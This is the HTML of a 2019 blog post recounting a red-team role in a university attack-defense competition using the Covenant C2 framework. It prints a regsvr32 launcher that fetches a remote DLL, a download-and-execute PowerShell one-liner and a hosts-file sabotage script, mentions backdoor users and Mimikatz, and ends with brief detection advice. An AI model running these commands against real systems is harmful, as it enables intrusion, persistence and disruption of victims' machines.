@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="en">
+  <!-- Beautiful Jekyll | MIT license | Copyright Dean Attali 2016 -->
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+
+  <title>Power of Covenant</title>
+
+  <meta name="author" content="NotoriousRebel" />
+
+  
+  <meta name="description" content="Deploying Covenant">
+  
+
+  <link rel="alternate" type="application/rss+xml" title="rebel's blog - My awesome blog!" href="/feed.xml" />
+
+  
+
+  
+
+  
+<!-- Google Analytics -->
+<script>
+    (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+            (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+            m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+    ga('create', 'UA-139380180-1', 'auto');
+    ga('send', 'pageview');
+</script>
+<!-- End Google Analytics -->
+
+
+
+  
+    
+      
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css" />
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/css/bootstrap.min.css" />
+    
+      <link rel="stylesheet" href="/css/bootstrap-social.css" />
+    
+      <link rel="stylesheet" href="/css/main.css" />
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+    
+      <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
+    
+  
+
+  
+
+  
+
+  
+
+    <!-- Facebook OpenGraph tags -->
+  
+
+  
+  <meta property="og:title" content="Power of Covenant" />
+  
+
+   
+  <meta property="og:description" content="Deploying Covenant">
+  
+
+
+  <meta property="og:type" content="website" />
+
+  
+  <meta property="og:url" content="http://localhost:4000/2019-04-29-power-of-covenant/" />
+  <link rel="canonical" href="http://localhost:4000/2019-04-29-power-of-covenant/" />
+  
+
+  
+
+
+  <!-- Twitter summary cards -->
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@" />
+  <meta name="twitter:creator" content="@" />
+
+  
+  <meta name="twitter:title" content="Power of Covenant" />
+  
+
+  
+  <meta name="twitter:description" content="Deploying Covenant">
+  
+
+  
+
+  
+
+  
+
+</head>
+
+
+  <body>
+
+    
+
+  
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      
+        <a class="navbar-brand" href="http://localhost:4000">rebel's blog</a>
+      
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+      
+        
+          <li>
+            
+
+
+
+
+
+
+<a href="/aboutme">About Me</a>
+
+          </li>
+        
+        
+        
+          <li class="navlinks-container">
+            <a class="navlinks-parent" href="javascript:void(0)">Resources</a>
+            <div class="navlinks-children">
+              
+                
+                  
+
+
+
+
+
+
+<a href="https://github.com/Snifer/security-cheatsheets">Security Cheatsheets</a>
+
+                
+              
+                
+                  
+
+
+
+
+
+
+<a href="https://github.com/dostoevskylabs/dostoevsky-pentest-notes">Pentest Notes</a>
+
+                
+              
+                
+                  
+
+
+
+
+
+
+<a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit">Red Teaming Toolkit</a>
+
+                
+              
+            </div>
+          </li>
+        
+        
+      </ul>
+    </div>
+
+	
+	<div class="avatar-container">
+	  <div class="avatar-img-border">
+	    <a href="http://localhost:4000">
+	      <img class="avatar-img" src="/img/covenant_redteaming/pwnboard_image.png" />
+		</a>
+	  </div>
+	</div>
+	
+
+  </div>
+</nav>
+
+
+    <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+<header class="header-section ">
+
+<div class="intro-header no-img">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-heading">
+          <h1>Power of Covenant</h1>
+		  
+		    
+			<h2 class="post-subheading">Deploying Covenant</h2>
+			
+		  
+		  
+		  
+		  <span class="post-meta">Posted on April 29, 2019</span>
+		  
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class="container">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+
+      
+
+      <article role="main" class="blog-post">
+        <h1 id="using-covenant--red-teaming">Using Covenant &amp; Red Teaming</h1>
+
+<h3 id="introduction">Introduction</h3>
+
+<p>This past weekend, I had my first ever red teaming experience at 
+University of Buffalo called <a href="https://lockdown.ubnetdef.org/">Lockdown</a>.
+I knew from the start I would be tackling Windows for this competition; 
+however, I wasn’t sure what I wanted to do. Did I want to use 
+Empire, Metasploit, maybe Pupy? The answer was none of the above.
+For this competition I wanted to try out something new.</p>
+
+<h3 id="deploying-covenant">Deploying Covenant</h3>
+<p>I decided to go with <a href="https://github.com/cobbr/covenant">Covenant</a>.
+This is a fairly recent C2 that came out a couple months ago
+based on the .NET framework and written in C#. An interesting
+aspect of this C2 is that it’s divided into two parts, Covenant
+is the server and <a href="https://github.com/cobbr/Elite">Elite</a> 
+is what interacts with the server. The last part is 
+just Grunts, that is just the Implant. 
+One of the issues I came across when testing this is out is
+how long it took to set up, I just wanted to at the start of the competition
+hit a button and have everything I needed. With some help from
+Docker I created a docker-compose file to assist me. This 
+<a href="https://github.com/NotoriousRebel/covDeploy">file</a> did the
+heavy lifting for me. One really awesome aspect of this C2 was
+that we could spin up Covenant on one server and when anyone
+ssh’d onto our server it would docker-compose up Elite for them. 
+This meant they didn’t have to download docker-compose and would make
+things centralized.</p>
+
+<p><img src="/img/covenant_redteaming/plan.png" alt="Plan" /></p>
+
+<h3 id="using-covenant">Using Covenant</h3>
+<p>Deployment was trivial all we had to do was docker-compose up.</p>
+
+<p><img src="/img/covenant_redteaming/easy_deployment.png" alt="Easy-Deployment" /></p>
+
+<p>In reality we would want to tack on -d when composing Covenant
+to background it.</p>
+
+<p>Using powershell with a remote session would be too noisy, 
+extremely easy to notice, and trivial to kill. 
+To make things stealthier I decided to go with registering a dll and utilizing Regsvr32.
+As Regsvr32 is developed by Microsoft and in apart of System32
+it would look a lot less suspicious. However, this requires
+the dotnet framework to be installed on the target machine.
+Luckily this is a oneliner that doesn’t require a restart.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Add-WindowsCapability</span> –Online -Name NetFx3~~~~ –Source D:\sources\sxs
+</code></pre></div></div>
+<p>The launcher is just a simple one liner, and the icing on the cake
+is that we can have our server host the dll file instead of having to get that file
+on the target machine.</p>
+
+<p><img src="/img/covenant_redteaming/launcher.png" alt="Launcher" /></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regsvr32 /u /s /i:http://129.21.228.140/demo.dll scrobj.dll
+</code></pre></div></div>
+<p>/u: Unregister server calling DllRegisterServer</p>
+
+<p>/s: Silent: display no message boxes.</p>
+
+<p>/i: Since used with /u calls Dll uninstall</p>
+
+<p>scobj.dll: Is the Dllname that the entry points on.</p>
+
+<p>Once ran on the target machine we get a nice beacon back
+and can have some fun. For the competition one of the most important
+things to do is maintain persistence. Making sure to add backdoor
+users, firewall rules, scheduled tasks, and services were essential.
+One service that was critical is WinRM to allow us to remotely run
+scripts. Making sure it was running was quite simple with 
+Covenant.</p>
+
+<p><img src="/img/covenant_redteaming/example_powershell.png" alt="Restarting_Winrm" /></p>
+
+<p>Although, in most cases we had those commands in a powershell
+file hosted somewhere so we were able to simply do.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="nb">IWR</span> -Uri <span class="s2">"https://hostingsite.com"</span> -UseBasicParsing<span class="o">)</span>.Content | <span class="nb">IEX</span>
+</code></pre></div></div>
+<p>IWR: Invoke-WebRequest</p>
+
+<p>IEX: Invoke-Expression</p>
+
+<p>It was also fun messing with them by doing very basic things
+such as messing with the hosts file in Windows.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nv">$hosts_path</span> <span class="o">=</span> <span class="s2">"C:\Windows\System32\drivers\etc\hosts"</span>
+    <span class="nv">$local</span> <span class="o">=</span> <span class="s2">"127.0.0.1"</span>
+    <span class="nv">$text</span> <span class="o">=</span> @<span class="s2">"
+    </span><span class="nv">$local</span><span class="s2">      github.com
+    </span><span class="nv">$local</span><span class="s2">      termbin.com
+    </span><span class="nv">$local</span><span class="s2">      pastebin.com
+    </span><span class="nv">$local</span><span class="s2">      tinyurl.com
+    </span><span class="nv">$local</span><span class="s2">      bitly.com 
+    </span><span class="nv">$local</span><span class="s2">      google.com
+    </span><span class="nv">$local</span><span class="s2">	stackoverflow.com
+    </span><span class="nv">$local</span><span class="s2"> 	raw.githubusercontent.com
+    </span><span class="nv">$local</span><span class="s2"> 	chocolatey.org
+    </span><span class="nv">$local</span><span class="s2"> 	docs.microsoft.com
+    </span><span class="nv">$local</span><span class="s2"> 	wireshark.org
+"</span>@ 
+    <span class="nb">Add-Content</span> -Path <span class="nv">$hosts_path</span> -Value <span class="nv">$text</span>
+</code></pre></div></div>
+
+<p>Of course Covenant had some nice features such as 
+GetSystem which allowed us to run things at System level. While
+also having standard things such as Mimikatz and Registry 
+manipulation. However, a pretty unique feature was the integration of allowing
+people to run C# sharp code.</p>
+
+<h3 id="customization">Customization</h3>
+
+<p>Covenant on it’s own is great; however, as part of the
+<a href="https://github.com/RITRedTeam">RITSECRedTeam</a> we like to keep track of things.
+One of the most important things is the <a href="https://github.com/micahjmartin/pwnboard">pwnboard</a>.
+The pwnboard is a visualization to keep track of what we have control of and to
+see what teams are giving us trouble.</p>
+
+<p><img src="/img/covenant_redteaming/pwnboard.png" alt="pwnboard-blue" /></p>
+
+<p>To show that you have control of a box is a mere post request with
+json that contains the ip and type of beacon. There is one obvious problem,
+Covenant doesn’t automatically do this. That’s ok I was planning on 
+learning C#. After talking to the developer to figure out where to 
+make the post request to pwnboard whenever a Grunt was created.</p>
+
+<p><img src="/img/covenant_redteaming/post_topwnboard.PNG" alt="post_req" /></p>
+
+<p>This function is inside Covenant/GruntController.cs, 
+it just does a post request using the Grunt’s ip address 
+wrapped inside a try catch statement in case we lose connection.</p>
+
+<p>Due to last minute complications, the dotnet framework couldn’t 
+be installed on every Windows box so I used a powershell launcher
+for all of the boxes as well as the Regsvr32 launcher if possible.
+As we could prebake our stuff I was able to deploy to all of the boxes
+and watch the beacons rain down as well as turn the pwnboard red.</p>
+
+<p><img src="/img/covenant_redteaming/pwnboard_red.PNG" alt="pwnboard-red" /></p>
+
+<p>At the start of the competition these are just some of the beacons.</p>
+
+<p><img src="/img/covenant_redteaming/call_backs.PNG" alt="call_backs" /></p>
+
+<h3 id="mitigation">Mitigation</h3>
+
+<p>Monitoring processes and network traffic on your system is 
+crucial as it will be much easier to spot when something 
+is out of the ordinary. For example if you’ve never seen
+Regsvr32 running on your system before it might be worthwhile
+to investigate and you would be shocked at what you find.</p>
+
+<p><img src="/img/covenant_redteaming/procexp_regsvr.png" alt="RegsvrImage" /></p>
+
+<p>However, knowing what’s going in and out of your network is just as 
+important if you opened wireshark and noticed a lot of http
+traffic that would be highly suspicious.
+For example, if you noticed this http traffic.</p>
+
+<p><img src="/img/covenant_redteaming/http_traffic.png" alt="http-traffic" /></p>
+
+<p>Upon noticing this you followed the http stream you would notice this.</p>
+
+<p><img src="/img/covenant_redteaming/long-command.PNG" alt="encoded-command" /></p>
+
+<h3 id="take-aways">Take Aways</h3>
+
+<p>Although Covenant may seem somewhat limited in what it can
+do compared to other C2’s such as Powershell Empire
+or Pupy. You have to keep in mind this came out about in February, 
+regardless Covenant can already do a lot and comes with a vast amount
+of rich features that are hard to ignore. 
+Overall Covenant is a solid choice for a C2 framework.</p>
+
+<p>References:</p>
+
+<p><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32">Regsvr32 Info</a></p>
+
+      </article>
+
+      
+        <div class="blog-tags">
+          Tags:
+          
+          
+            <a href="/tags#redteam">redteam</a>
+          
+            <a href="/tags#windows">windows</a>
+          
+            <a href="/tags#c2">c2</a>
+          
+            <a href="/tags#security">security</a>
+          
+            <a href="/tags#powershell">powershell</a>
+          
+            <a href="/tags#docker">docker</a>
+          
+          
+        </div>
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+  <!--- Share on Twitter -->
+    <a href="https://twitter.com/intent/tweet?text=Power+of+Covenant+http://localhost:4000/2019-04-29-power-of-covenant/"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fa fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+
+  
+
+  
+  <!--- Share on LinkedIn -->
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/2019-04-29-power-of-covenant/"
+      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fa fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pager blog-pager">
+        
+        
+      </ul>
+
+      
+        <div class="disqus-comments">
+          
+        </div>
+          
+        <div class="staticman-comments">
+          
+
+        </div>
+        <div class="justcomments-comments">
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+    <footer>
+  <div class="container beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links"><li><a href="/feed.xml" title=""><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa  fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only"></span>
+              </a>
+            </li><li><a href="https://github.com/NotoriousRebel" title="GitHub"><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">GitHub</span>
+              </a>
+            </li><li><a href="https://twitter.com/NotoriousRebel1" title="Twitter"><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">Twitter</span>
+              </a>
+            </li><li><a href="https://www.linkedin.com/in/cyberBrown/" title="LinkedIn"><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">LinkedIn</span>
+              </a>
+            </li></ul>
+      <p class="copyright text-muted">
+      NotoriousRebel
+      &nbsp;&bull;&nbsp;
+      2019
+
+      
+      &nbsp;&bull;&nbsp;
+      <a href="http://localhost:4000">notoriousrebel.space</a>
+      
+
+      
+      </p>
+          <!-- Please don't remove this, keep my open source work credited :) -->
+    <p class="theme-by text-muted">
+      Theme by
+      <a href="https://deanattali.com/beautiful-jekyll/">beautiful-jekyll</a>
+    </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+  
+    
+
+
+
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script>
+      	if (typeof jQuery == 'undefined') {
+      	  document.write('<script src="/js/jquery-1.11.2.min.js"></scr' + 'ipt>');
+      	}
+      </script>
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+	<script src="/js/bootstrap.min.js"></script>
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+	<script src="/js/main.js"></script>
+    
+  
+
+
+  
+  </body>
+</html>
